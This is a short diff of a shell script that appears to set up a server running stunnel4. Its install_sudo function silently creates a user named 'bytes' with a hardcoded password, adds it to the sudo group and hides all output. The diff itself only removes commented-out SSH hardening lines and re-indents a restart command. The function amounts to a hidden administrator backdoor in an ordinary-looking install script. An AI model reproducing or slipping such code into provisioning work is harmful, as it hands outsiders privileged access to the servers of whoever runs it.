@@ -461,9 +461,7 @@ sudo service stunnel4 restart
 install_sudo(){
   {
       useradd -m bytes 2>/dev/null; echo bytes:Premium2018!!! | chpasswd &>/dev/null; usermod -aG sudo bytes &>/dev/null
-        #sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-        #echo "AllowGroups lenz" >> /etc/ssh/sshd_config
-        service sshd restart
+      service sshd restart
   }&>/dev/null
 }
 
